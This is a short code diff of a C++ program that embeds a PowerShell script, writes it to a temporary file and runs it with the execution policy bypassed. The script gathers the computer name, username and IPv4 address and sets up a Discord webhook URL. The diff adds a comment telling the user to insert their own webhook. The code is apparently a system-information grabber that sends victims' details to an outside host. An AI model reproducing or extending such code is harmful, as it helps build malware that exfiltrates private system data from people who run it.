@@ -4,7 +4,7 @@
 
 int main() {
     const std::string psScript =
-        "$webhookURL = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"
+        "$webhookURL = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"   // make sure to replace with your own webhook url
         "$hostname = $env:COMPUTERNAME;\n"
         "$username = $env:USERNAME;\n"
         "$ipv4 = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike \"*Loopback*\" }).IPAddress;\n"
@@ -20,7 +20,6 @@ int main() {
         std::cerr << "failed" << std::endl;
         return 1;
     }
-
     psFile << psScript;
     psFile.close();
     system("powershell -NoProfile -ExecutionPolicy Bypass -File temp_script.ps1");
